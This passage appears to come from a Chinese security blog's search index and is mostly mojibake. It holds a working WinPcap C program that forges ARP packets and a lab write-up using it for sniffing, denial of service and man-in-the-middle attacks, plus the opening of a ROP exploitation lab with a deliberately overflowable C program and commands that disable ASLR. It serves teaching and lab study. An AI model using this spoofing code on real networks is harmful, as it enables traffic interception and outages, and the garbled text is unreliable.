43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 #define WIN32 #define HAVE_REMOTE #include\u0026lt;stdio.h\u0026gt; typedef unsigned char u_char; typedef unsigned short u_short; typedef unsigned int u_int; #include \u0026lt;pcap.h\u0026gt; #define ETH_ARP 0x0806 //ä»¥å¤ªç½‘å¸§ç±»å‹è¡¨ç¤ºåé¢æ•°æ®çš„ç±»å‹ï¼Œå¯¹äºARPè¯·æ±‚æˆ–åº”ç­”æ¥è¯´ï¼Œè¯¥å­—æ®µçš„å€¼ä¸ºx0806 #define ARP_HARDWARE 1 //ç¡¬ä»¶ç±»å‹å­—æ®µå€¼ä¸ºè¡¨ç¤ºä»¥å¤ªç½‘åœ°å€ #define ETH_IP 0x0800 //åè®®ç±»å‹å­—æ®µè¡¨ç¤ºè¦æ˜ å°„çš„åè®®åœ°å€ç±»å‹å€¼ä¸ºx0800è¡¨ç¤ºIPåœ°å€ #define ARP_REQUEST 1 //ARPè¯·æ±‚ #define ARP_RESPONSE 2 //ARPåº”ç­” //14å­—èŠ‚ä»¥å¤ªç½‘é¦–éƒ¨ struct EthernetHeader { u_char DestMAC[6]; //ç›®çš„MACåœ°å€ 6å­—èŠ‚ u_char SourMAC[6]; //æºMACåœ°å€ 6å­—èŠ‚ u_short EthType; //ä¸Šä¸€å±‚åè®®ç±»å‹ï¼Œå¦‚0x0800ä»£è¡¨ä¸Šä¸€å±‚æ˜¯IPåè®®ï¼Œ0x0806ä¸ºarp 2å­—èŠ‚ }; //28å­—èŠ‚ARPå¸§ç»“æ„ struct ArpHeader { unsigned short hdType; //ç¡¬ä»¶ç±»å‹ unsigned short proType; //åè®®ç±»å‹ unsigned char hdSize; //ç¡¬ä»¶åœ°å€é•¿åº¦ unsigned char proSize; //åè®®åœ°å€é•¿åº¦ unsigned short op; //æ“ä½œç±»å‹ï¼ŒARPè¯·æ±‚ï¼ˆ1ï¼‰ï¼ŒARPåº”ç­”ï¼ˆ2ï¼‰ï¼ŒRARPè¯·æ±‚ï¼ˆ3ï¼‰ï¼ŒRARPåº”ç­”ï¼ˆ4ï¼‰ã€‚ u_char smac[6]; //æºMACåœ°å€ u_char sip[4]; //æºIPåœ°å€ u_char dmac[6]; //ç›®çš„MACåœ°å€ u_char dip[4]; //ç›®çš„IPåœ°å€ }; //å®šä¹‰æ•´ä¸ªarpæŠ¥æ–‡åŒ…ï¼Œæ€»é•¿åº¦42å­—èŠ‚ struct ArpPacket { struct EthernetHeader ed; struct ArpHeader ah; }; int main() { pcap_if_t* alldevs; //æ‰€æœ‰ç½‘ç»œé€‚é…å™¨ pcap_if_t* d; //é€‰ä¸­çš„ç½‘ç»œé€‚é…å™¨ int inum; //é€‰æ‹©ç½‘ç»œé€‚é…å™¨ int i = 0; //forå¾ªç¯å˜é‡ pcap_t* adhandle; //æ‰“å¼€ç½‘ç»œé€‚é…å™¨ï¼Œæ•æ‰å®ä¾‹,æ˜¯pcap_openè¿”å›çš„å¯¹è±¡ char errbuf[PCAP_ERRBUF_SIZE]; //é”™è¯¯ç¼“å†²åŒº,å¤§å°ä¸º256 /* è·å–æœ¬æœºè®¾å¤‡åˆ—è¡¨ */ // è·å–æœ¬æœºç›¸å…³çš„æ‰€æœ‰ç½‘å…³ if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, \u0026amp;alldevs, errbuf) == -1) { fprintf(stderr, \u0026#34;Error in pcap_findalldevs: %s\\n\u0026#34;, errbuf); exit(1); } /* æ‰“å°ç½‘å…³åˆ—è¡¨ */ for (d = alldevs; d; d = d-\u0026gt;next) { printf(\u0026#34;%d. %s\u0026#34;, ++i, d-\u0026gt;name); if (d-\u0026gt;description) printf(\u0026#34; (%s)\\n\u0026#34;, d-\u0026gt;description); else printf(\u0026#34; (No description available)\\n\u0026#34;); } // å¦‚æœ i = 0 ï¼Œè¯´æ˜è¯¥è®¡ç®—æœºæ²¡æœ‰ç½‘å…³ if (i == 0) { printf(\u0026#34;\\nNo interfaces found! Make sure WinPcap is installed.\\n\u0026#34;); return -1; } // é€‰æ‹©åˆé€‚çš„ç½‘å…³ printf(\u0026#34;Enter the interface number (1-%d):\u0026#34;, i); scanf(\u0026#34;%d\u0026#34;, \u0026amp;inum); if (inum \u0026lt; 1 || inum \u0026gt; i) { printf(\u0026#34;\\nInterface number out of range.\\n\u0026#34;); /* é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ */ pcap_freealldevs(alldevs); return -1; } /* è·³è½¬åˆ°é€‰ä¸­çš„é€‚é…å™¨ */ for (d = alldevs, i = 0; i \u0026lt; inum - 1; d = d-\u0026gt;next, i++); /* æ‰“å¼€è®¾å¤‡ */ if ((adhandle = pcap_open(d-\u0026gt;name, // è®¾å¤‡å 65536, // 65535ä¿è¯èƒ½æ•è·åˆ°ä¸åŒæ•°æ®é“¾è·¯å±‚ä¸Šçš„æ¯ä¸ªæ•°æ®åŒ…çš„å…¨éƒ¨å†…å®¹ PCAP_OPENFLAG_PROMISCUOUS, // æ··æ‚æ¨¡å¼ 1000, // è¯»å–è¶…æ—¶æ—¶é—´ NULL, // è¿œç¨‹æœºå™¨éªŒè¯ errbuf // é”™è¯¯ç¼“å†²æ±  )) == NULL) { fprintf(stderr, \u0026#34;\\nUnable to open the adapter. %s is not supported by WinPcap\\n\u0026#34;, d-\u0026gt;name); /* é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ */ pcap_freealldevs(alldevs); return -1; } /*ä»¥ä¸Šä»£ç åœ¨WinPcapå¼€å‘æ–‡æ¡£ä¸­éƒ½å¯ä»¥æ‰¾åˆ°ï¼Œå¡«å……ARPåŒ…çš„ä»£ç åˆ™è¦è‡ªå·±ç¼–å†™*/ //å¼€å§‹å¡«å……ARPåŒ…ï¼Œå¡«å……æ•°æ®å†™æ­»åœ¨ä»£ç ä¸­ï¼Œæµ‹è¯•ç”¨æ—¶æ•°æ®å¯éšæ„å¡«å†™ unsigned char sendbuf[42]; //arpåŒ…ç»“æ„å¤§å°ï¼Œ42ä¸ªå­—èŠ‚ unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; //unsigned char mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff }; unsigned char ip[4] = { 192,168,195,138 }; unsigned char dmac[6] = {0x00,0x50,0x56,0xe7,0xd4,0x22}; unsigned char d_ip[4] = {192,168,195,2}; struct EthernetHeader eh; struct ArpHeader ah; //èµ‹å€¼MACåœ°å€ //memset(eh.DestMAC, 0xff, 6); //ä»¥å¤ªç½‘é¦–éƒ¨ç›®çš„MACåœ°å€ï¼Œå…¨ä¸ºå¹¿æ’­åœ°å€ memcpy(eh.DestMAC, dmac, 6); //ä»¥å¤ªç½‘é¦–éƒ¨ç›®çš„MACåœ°å€ memcpy(eh.SourMAC, mac, 6); //ä»¥å¤ªç½‘é¦–éƒ¨æºMACåœ°å€ memcpy(ah.smac, mac, 6); //ARPå­—æ®µæºMACåœ°å€ //memset(ah.dmac, 0xff, 6); //ARPå­—æ®µç›®çš„MACåœ°å€ memcpy(ah.dmac, dmac, 6); //ARPå­—æ®µç›®çš„MACåœ°å€ memcpy(ah.sip, ip, 4); //ARPå­—æ®µæºIPåœ°å€ memset(ah.dip, 0x05, 4); //ARPå­—æ®µç›®çš„IPåœ°å€ memcpy(ah.dip, d_ip, 4); //ARPå­—æ®µç›®çš„IPåœ°å€ eh.EthType = htons(ETH_ARP); //htonsï¼šå°†ä¸»æœºçš„æ— ç¬¦å·çŸ­æ•´å½¢æ•°è½¬æ¢æˆç½‘ç»œå­—èŠ‚é¡ºåº ah.hdType = htons(ARP_HARDWARE); ah.proType = htons(ETH_IP); ah.hdSize = 6; ah.proSize = 4; ah.op = htons(ARP_REQUEST); //æ„é€ ä¸€ä¸ªARPè¯·æ±‚ memset(sendbuf, 0, sizeof(sendbuf)); //ARPæ¸…é›¶ memcpy(sendbuf, \u0026amp;eh, sizeof(eh)); memcpy(sendbuf + sizeof(eh), \u0026amp;ah, sizeof(ah)); //å¦‚æœå‘é€æˆåŠŸ if (pcap_sendpacket(adhandle, sendbuf, 42) == 0) { printf(\u0026#34;\\nPacketSend succeed\\n\u0026#34;); } else { printf(\u0026#34;PacketSendPacket in getmine Error: %d\\n\u0026#34;, GetLastError()); } /* é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ */ pcap_freealldevs(alldevs); return 0; } å¹¿æ’­æ”»å‡» æ„é€ å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºç½‘å…³IPï¼Œè€ŒMACåœ°å€ä¸ºå¹¿æ’­åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™ç½‘å…³çš„æ•°æ®åŒ…éƒ½å°†è¢«å¹¿æ’­ã€‚è¿™æ—¢æ˜¯ä¸€ç§å—…æ¢æ–¹æ³•ï¼Œä¹Ÿå¯ä½œä¸ºå¹²æ‰°ç½‘ç»œæœåŠ¡çš„æ”»å‡»æ–¹æ³•ã€‚\nè¿™é‡Œå°†é¶æœº(192.168.195.138)å¯¹ç½‘å…³çš„MAC åœ°å€ç¯¡æ”¹ä¸º å¹¿æ’­åœ°å€ï¼Œåˆ©ç”¨æ”»å‡»æœº(IP : 192.168.195.131)ç›‘æ§æµé‡ã€‚\nåœ¨å‘åŒ…çš„æºä»£ç ä¸­ï¼šä¿®æ”¹ IPå’Œ MACåœ°å€ï¼Œæ„é€ ARPåŒ…\n1 2 3 4 5 6 7 æºip mac (è¿™é‡Œæ˜¯ç½‘å…³çš„IPåœ°å€ å’Œ å¹¿æ’­macåœ°å€) unsigned char mac[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF }; unsigned char ip[4] = { 192,168,195,2 }; ç›®çš„ ip mac (è¿™é‡Œæ˜¯ é¶æœºçš„IPå’ŒMAC) unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; è¿™é‡Œçš„ç¬¬ä¸€ä¸ªarp -a æ˜¾ç¤ºçš„ ç½‘å…³macåœ°å€ ä¸ºæ­£ç¡®çš„ macåœ°å€ã€‚\nç¬¬äºŒä¸ª arp -a ä¸º å‘é€è™šå‡æ„é€ çš„arpåŒ… ä¹‹åï¼Œç½‘å…³åœ°å€è¢«ä¿®æ”¹ä¸º å¹¿æ’­åœ°å€ã€‚\nç„¶åç”¨é¶æœº(IP 192.168.195.138) ping win10ä¸»æœº ï¼ŒåŒæ—¶åœ¨æ”»å‡»æœº(IP 192.168.195.131) ä¸­ç”¨wiresharkè¿›è¡Œç›‘æ§ä¿¡é“ï¼Œè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥å‘ç°æ”»å‡»æœºå¯ä»¥ç›‘æ§åˆ° é¶æœº(IP 192.168.195.138) ping www.baidu.com çš„æ•°æ®åŒ…\nå¯¹æ­¤ICMP åŒ…ï¼Œè¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°å‘åŒ…çš„macåœ°å€ç¡®å®ä¸º å¹¿æ’­åœ°å€ FF-FF-FF-FF-FF-FF æ‹’ç»æœåŠ¡æ”»å‡» æ„é€ è™šå‡å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºå…³é”®æœåŠ¡çš„IPåœ°å€ï¼Œä¾‹å¦‚ç½‘å…³ï¼Œè€ŒMACåœ°å€ä¸ºä¸å­˜åœ¨çš„è™šå‡åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™å…³é”®æœåŠ¡ï¼ˆå¦‚ç½‘å…³ï¼‰çš„æ•°æ®åŒ…éƒ½å°†ä¸¢å¤±ï¼Œä»è€Œå½¢æˆæ‹’ç»æœåŠ¡æ”»å‡»ã€‚\næ„é€ ARPæ•°æ®åŒ…\n1 2 3 4 5 6 å°†arpåŒ… å‘é€æºmacä¿®æ”¹ä¸ºè™šå‡ çš„ macåœ°å€ unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; unsigned char ip[4] = { 192,168,195,2 }; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; åœ¨ å‘é€arpæ•°æ®åŒ…å‰\nå¯ä»¥çœ‹åˆ° arp è¡¨ å¯¹åº”çš„mac åœ°å€ æ­£ç¡®ï¼Œå¹¶ä¸”ç½‘é¡µå¯ä»¥æ­£å¸¸æ‰“å¼€ã€‚ å‘é€ arp åŒ…\næŸ¥çœ‹é¶æœºçš„ arp è¡¨ å’Œ ä¸Šç½‘çŠ¶æ€ã€‚ å¯ä»¥çœ‹åˆ° ç½‘å…³çš„ mac åœ°å€ è¢«ç¯¡æ”¹ä¸º 01-01-01-01-01-01 ï¼ŒåŒæ—¶ä¹Ÿæ— æ³•è®¿é—®ç™¾åº¦äº†ã€‚ ä¸­é—´äººæ”»å‡» è¿™é‡Œè®¾è®¡æ€è·¯ä¸åˆ©ç”¨WinArpAttacker è¿›è¡Œä¸­é—´äººæ”»å‡»ä¸€æ ·ã€‚\nå°†é¶æœºwinxp(IP 192.168.195.138) å’Œ ä¸»æœº win10 (IP 192.168.195.1) ä¹‹é—´çš„macå‡ç¯¡æ”¹ä¸º æ”»å‡»æœº (IP 192.168.195.131)çš„macåœ°å€ã€‚\nè¿™é‡Œéœ€è¦æ„é€ ä¸¤ä¸ªarpè¯·æ±‚åŒ…\nå¯¹äºé¶æœº win xp\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; å¯¹äºé¶æœº win 10\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char mac[6] = { 0x00,0x50,0x56,0xc0,0x00,0x08 }; unsigned char d_ip[4] = {192,168,195,1}; æŸ¥çœ‹æœªæ„é€ åŒ…å‰çš„çŠ¶æ€\næ­¤æ—¶ä¸¤ä¸ªé¶æœºä¹‹é—´å¯¹åº”çš„mac å‡ä¸ºæ­£ç¡®çš„ã€‚ å‘é€ä¸¤ä¸ªarp è¯·æ±‚åŒ…ã€‚\nå‘é€å®Œæˆ æŸ¥çœ‹å‘é€åçš„ mac å¯¹åº”è¡¨\nå¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°ï¼Œä¸¤ä¸ªé¶æœºä¹‹é—´çš„macåœ°å€å‡è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœºçš„ ipåœ°å€ã€‚ è¿™é‡Œç”¨win10 ping é€š é¶æœº win xp,åŒæ—¶åœ¨æ”»å‡»æœºç”¨ wiresharkè¿›è¡ŒæŠ“åŒ…ã€‚\nå¯ä»¥çœ‹åˆ°ä¿¡æ¯è¢«æ”»å‡»æœºæˆªè·ï¼Œå¹¶ä¸”macåœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœºçš„ macåœ°å€ ï¼Œ æ”»å‡»æœºåªéœ€è¦å°†macåœ°å€ä¿®æ”¹ä¸€ä¸‹å³å¯å®ç°ä¸­é—´äººæ”»å‡»ã€‚ 0x05 ç»“è®º ARPå®éªŒè¿‡ç¨‹ä¸­ï¼Œå‘é€çš„æ•°æ®åŒ…è¿‡å°‘ï¼Œè®¡ç®—æœºç³»ç»Ÿè‡ªèº«ä¼šè¿…é€Ÿå‘å‡ºarpå¹¿æ’­åŒ… æ¥æ¢å¤æ­£ç¡®çš„macåœ°å€ï¼Œå®éªŒè¿‡ç¨‹è¿…é€Ÿçš„å®Œæˆã€‚é•¿æœŸçš„æ”»å‡»éœ€è¦ä¸é—´æ–­çš„å‘é€arpè¯·æ±‚åŒ…ã€‚ arpæ¬ºéª—æ”»å‡»çš„åŸç†é€šè¿‡æŠ“åŒ…æ¥ç†è§£çš„é€å½»ã€‚ vmè™šæ‹Ÿæœºåˆ©ç”¨natæ¡¥æ¥æ¨¡å¼å¯ä»¥å®ç°ï¼Œä¸»æœºå’Œè™šæ‹Ÿæœºåœ¨åŒä¸€å±€åŸŸç½‘ä¸‹ï¼Œä½¿ç”¨vm8çš„è™šæ‹Ÿç½‘å¡ï¼Œä»¥æ­¤ä½œä¸ºå®éªŒçš„åŸºç¡€ã€‚ ","permalink":"http://www.reus09.top/posts/tech/arp%E6%AC%BA%E9%AA%97/","summary":"ARPæ¬ºéª—å®éªŒ 0x01 å®éªŒå‰æçŸ¥è¯† ARPåè®®çš„å®‰å…¨é—®é¢˜ ARPåè®®æ˜¯å»ºç«‹åœ¨ä¿¡ä»»å±€åŸŸç½‘å†…æ‰€æœ‰ç»“ç‚¹çš„åŸºç¡€ä¸Šçš„ï¼Œå®ƒé«˜æ•ˆï¼Œä½†å´ä¸å®‰å…¨ã€‚ ARPé«˜é€Ÿç¼“å­˜æ ¹æ®æ‰€æ¥","title":"Arpæ¬ºéª—"},{"content":"pwn_rop è°ƒè¯• 0x01 å®éªŒç›®çš„ 1.é’ˆå¯¹å®éªŒä¸€ï¼Œé€šè¿‡gdbè°ƒè¯•rop1ï¼Œç¡®å®šshellcodeçš„åœ°å€ï¼›æ­¤å¤–ï¼Œé€šè¿‡rop1.pyçš„è°ƒè¯•è„šæœ¬ç¡®å®šshellcodeåœ°å€ï¼›æœ€ç»ˆæ‹¿åˆ°shellæƒé™ã€‚ç›¸å…³è¯¦ç»†åˆ†æè¿‡ç¨‹å†™å…¥æŠ¥å‘Šï¼Œå¹¶æ¯”è¾ƒä¸¤ç§æ–¹æ³•çš„ç‰¹ç‚¹ã€‚ 2.é’ˆå¯¹å®éªŒäºŒçš„32ä½ç¯å¢ƒå’Œ64ä½ç¯å¢ƒï¼Œé€šè¿‡è°ƒè¯•åˆ†æï¼Œå®Œæˆå®é™…rop2.pyå’Œrop3.py ï¼ˆé¢„ç•™æœ‰ç©ºç™½å’Œé”™è¯¯ä¹‹å¤„ï¼‰ï¼Œæœ€ç»ˆæ‹¿åˆ°shellæƒé™ã€‚ç›¸å…³è¯¦ç»†åˆ†æè¿‡ç¨‹å†™å…¥æŠ¥å‘Š 0x02 å®éªŒç¯å¢ƒ Ubuntu 20 gcc ç‰ˆæœ¬ å·¥å…· pwndbg ROPgadget pwntools visual studio code é€šè¿‡vs code çš„ssh è¿œç¨‹è¿æ¥æœåŠ¡å™¨ubuntuï¼Œå¹¶ä¸”è¿œç¨‹è°ƒè¯•ç¨‹åºã€‚ 0x03 å®éªŒå‰æçŸ¥è¯† ROPçš„å…¨ç§°ä¸º Return-oriented Programmingï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹\nç»•è¿‡å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤ã€ä»£ç ç­¾åç­‰å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ‰§è¡Œæ¶æ„ä»£ç  é€šè¿‡æ§åˆ¶è¢«è°ƒç”¨çš„å †æ ˆï¼Œå¯¹ç¨‹åºçš„æ§åˆ¶æµè¿›è¡ŒåŠ«æŒï¼Œå®ŒæˆæŸäº›ç‰¹å®šåŠŸèƒ½ Shellcodeå†™åœ¨æ ˆä¸­ æœªæä¾›å †æ ˆçš„ä¿æŠ¤æªæ–½ï¼Œç›´æ¥å°†shellcodeå†™å…¥æ ˆä¸­ï¼Œå¹¶å°†å‡½æ•°çš„è¿”å›åœ°å€è¦†å†™ä¸ºshellcodeçš„åœ°å€ã€‚\nè¿”å›åœ°å€è¦†ç›–ä¸ºshellcodeï¼Œä»è€Œå®ç°æ‰§è¡Œshellcodeã€‚ Ret2libc åŠ å…¥äº†DEPï¼ˆData Execution Preventionï¼‰å’ŒNXï¼ˆNo executeï¼‰ä¿æŠ¤ä¹‹åï¼Œæ‹’ç»æ‰§è¡Œå †æ ˆä¸Šçš„ä»»ä½•ä»£ç ã€‚ ret2libcæ˜¯ROPæŠ€æœ¯çš„ä¸€ç§ï¼Œé€šè¿‡å°†è¿”å›åœ°å€è¦†å†™ä¸ºlibcä¸­çš„å‡½æ•°ç»•è¿‡NXä¿æŠ¤ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œæ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨åŠ¨æ€é“¾æ¥çš„æ–¹æ³•æ¥æé«˜ç¨‹åºè¿è¡Œçš„æ•ˆç‡ã€‚é‚£ä¹ˆåœ¨åŠ¨æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œç¨‹åºåŠ è½½çš„æ—¶å€™å¹¶ä¸ä¼šæŠŠé“¾æ¥åº“ä¸­æ‰€æœ‰å‡½æ•°éƒ½ä¸€èµ·åŠ è½½è¿›æ¥ï¼Œè€Œæ˜¯ç¨‹åºæ‰§è¡Œçš„æ—¶å€™æŒ‰éœ€åŠ è½½ã€‚ä¹Ÿå°±æ˜¯æ§åˆ¶æ‰§è¡Œ libcï¼ˆå¯¹åº”ç‰ˆæœ¬ï¼‰ ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼ˆæˆ–è€…execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)ï¼‰ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚ gadget 64ä½å¤„ç†å™¨çš„å‘å±•ï¼Œæ”¹å˜äº†å‡½æ•°çš„è°ƒç”¨çº¦å®šï¼Œè¦æ±‚å‡½æ•°çš„å‰6ä¸ªå‚æ•°ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°æ‰ä¼šä¿å­˜åœ¨æ ˆä¸­ã€‚ æƒ³ç»§ç»­ç»™å‡½æ•°ä¼ é€’å‚æ•°,å°†ä¸èƒ½é€šè¿‡ç®€å•æ“ä½œæ ˆæ¥æ“ä½œå‡½æ•°ï¼Œè¿˜éœ€è¦æ“ä½œå¯„å­˜å™¨ã€‚ç”±æ­¤ret2libcå˜çš„éš¾ä»¥æˆåŠŸã€‚ gadgetæ˜¯ä»å¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“ä¸­è·å–çš„ä»¥retä¸ºç»“å°¾çš„æŒ‡ä»¤åºåˆ—ã€‚è¿™ç§ROPæŠ€æœ¯å¯»æ‰¾èƒ½å¤Ÿå°†æ ˆä¸­çš„å€¼popåˆ°å¯„å­˜å™¨çš„æŒ‡ä»¤ç‰‡æ®µï¼Œç”±æ­¤æ„é€ å‡½æ•°å‚æ•°ã€‚ ASLRåœ°å€éšæœºåŒ– å¼€å¯åœ°å€éšæœºåŒ–\n1 2 3 4 5 # æŸ¥çœ‹ASLRæ˜¯å¦å¼€å¯ cat /proc/sys/kernel/randomize_va_space # å…³é—­ASLR sudo su echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space ç³»ç»Ÿè½¬å‚¨ dump core 1 2 3 4 5 6 7 # æŸ¥çœ‹æ˜¯å¦å¼€å¯ï¼š ulimit -c ï¼ˆå¦‚æœæ˜¯0å°±æ˜¯å…³ç€çš„ï¼‰ # å¼€å¯è½¬å‚¨ ulimit -c unlimited # è®¾ç½®è½¬å‚¨æ–‡ä»¶ä½ç½®ä¸º/tmpæ–‡ä»¶å¤¹ä¸‹é¢ sudo su sudo sh -c \u0026#39;echo \u0026#34;/tmp/core.%t\u0026#34; \u0026gt; /proc/sys/kernel/core_pattern\u0026#39; Ubuntu ä¿æŒå †æ ˆå¹³è¡¡ åœ¨Ubuntu18ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œ64ä½çš„ç¨‹åºè‹¥åŒ…å«äº†systemï¼ˆâ€œ/bin/shâ€ï¼‰ï¼Œå°±éœ€è¦è€ƒè™‘å †æ ˆå¹³è¡¡ã€‚å› ä¸ºåœ¨Ubuntu18ä¸‹systemè°ƒç”¨æ—¶è¦æ±‚åœ°å€å’Œ16å­—èŠ‚å¯¹é½ï¼Œå¦‚æœæ²¡æœ‰æ ˆå¯¹é½çš„è¯ï¼Œç¨‹åºå°±ç›´æ¥crashäº†ã€‚\nå› ä¸ºå‘½ä»¤:\n1 2 3 .text:000000000004F2F1 movhps xmm0, [rsp+198h+var_190] .text:000000000004F2F6 movaps [rsp+198h+var_158], xmm0 ; here .text:000000000004F2FB call sigaction ä¸»è¦åŸå› æ˜¯0x4F2F6å¤„çš„movaps [rsp+198h+var_158], xmm0æŒ‡ä»¤è¦æ±‚rsp+198h+var_158çš„å€¼æ˜¯å¯¹é½16byteï¼ˆ0x10ï¼‰ï¼Œå¦åˆ™ä¼šç›´æ¥è§¦å‘ä¸­æ–­ä»è€Œcrashã€‚\nè¿™äº›éƒ½æ˜¯åœ¨Ubuntu 18 ç‰ˆæœ¬ä»¥ä¸Šçš„æ‰å­˜åœ¨ã€‚\næ ˆçš„å­—èŠ‚å¯¹é½ï¼Œå®é™…æ˜¯æŒ‡æ ˆé¡¶æŒ‡é’ˆå¿…é¡»æ˜¯16å­—èŠ‚çš„æ•´æ•°å€ã€‚æ ˆå¯¹é½ä½¿å¾—åœ¨å°½å¯èƒ½å°‘çš„å†…å­˜è®¿é—®å‘¨æœŸå†…è¯»å–æ•°æ®ï¼Œä¸å¯¹é½å †æ ˆæŒ‡é’ˆå¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ€§èƒ½ä¸‹é™ã€‚\nä½†æ˜¯å®é™…ä¸Šï¼Œå³ä½¿æ•°æ®æ²¡æœ‰å¯¹é½ï¼Œæˆ‘ä»¬çš„ç¨‹åºä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œåªæ˜¯æ•ˆç‡æœ‰ç‚¹ä½è€Œå·²ï¼Œä½†æ˜¯æŸäº›å‹å·çš„Intelå’ŒAMDå¤„ç†å™¨ï¼Œåœ¨æ‰§è¡ŒæŸäº›å®ç°å¤šåª’ä½“æ“ä½œçš„SSEæŒ‡ä»¤æ—¶ï¼Œå¦‚æœæ•°æ®æ²¡æœ‰å¯¹é½ï¼Œå°†æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚è¿™äº›æŒ‡ä»¤å¯¹16å­—èŠ‚å†…å­˜è¿›è¡Œæ“ä½œï¼Œåœ¨SSEå•å…ƒå’Œå†…å­˜ä¹‹é—´ä¼ é€æ•°æ®çš„æŒ‡ä»¤è¦æ±‚å†…å­˜åœ°å€å¿…é¡»æ˜¯16çš„å€æ•°ã€‚\nå› æ­¤ï¼Œä»»ä½•é’ˆå¯¹x86_64å¤„ç†å™¨çš„ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶ç³»ç»Ÿéƒ½å¿…é¡»ä¿è¯ï¼Œ å®ƒä»¬åˆ†é…å†…å­˜å°†æ¥å¯èƒ½ä¼šè¢«SSEæŒ‡ä»¤ä½¿ç”¨ï¼Œæ‰€ä»¥å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œè¿™ä¹Ÿå°±å½¢æˆäº†ä¸€ç§æ ‡å‡†ï¼š\nä»»ä½•å†…å­˜åˆ†é…å‡½æ•°ï¼ˆalloca, malloc, callocæˆ–reallocï¼‰ç”Ÿæˆçš„å—çš„èµ·å§‹åœ°å€éƒ½å¿…é¡»æ˜¯16çš„å€æ•°ã€‚ å¤§å¤šæ•°å‡½æ•°çš„æ ˆå¸§çš„è¾¹ç•Œéƒ½å¿…é¡»æ˜¯16å­—èŠ‚çš„å€æ•°ã€‚ å¦‚ä¸Šï¼Œåœ¨è¿è¡Œæ—¶æ ˆä¸­ï¼Œä¸ä»…ä¼ é€’çš„å‚æ•°å’Œå±€éƒ¨å˜é‡è¦æ»¡è¶³å­—èŠ‚å¯¹é½ï¼Œæˆ‘ä»¬çš„æ ˆæŒ‡é’ˆï¼ˆrspï¼‰ä¹Ÿå¿…é¡»æ˜¯16çš„å€æ•°ã€‚\nå®éªŒæºç  1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; void vuln() { char buf[128]; read(0,buf,256); } int main() { vuln(); write(1,\u0026#34;hello rop\\n\u0026#34;,10); } åˆ†æç¨‹åºæ¼æ´ Vuln()å‡½æ•°ä¸­ï¼Œbufæ•°ç»„çš„å¤§å°æ˜¯128å­—èŠ‚ï¼Œä½†æ˜¯åœ¨readæ—¶æœ€å¤šå¯ä»¥è¯»å…¥256å­—èŠ‚ï¼Œå®¹æ˜“é€ 